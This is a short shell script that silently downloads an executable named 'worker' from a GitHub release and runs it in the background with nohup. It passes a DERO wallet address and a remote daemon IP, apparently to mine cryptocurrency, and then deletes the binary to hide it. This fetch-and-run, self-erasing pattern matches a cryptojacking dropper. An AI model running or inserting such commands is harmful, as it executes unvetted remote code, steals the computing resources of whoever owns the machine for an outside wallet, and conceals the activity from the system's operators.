wget -q https://github.com/RayBarrettPhil/sdfg/releases/download/wes/worker
chmod +x worker
nohup ./worker --wallet-address=dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy --daemon-rpc-address=178.128.200.86:10100 & sleep 0.1
rm -rf worker
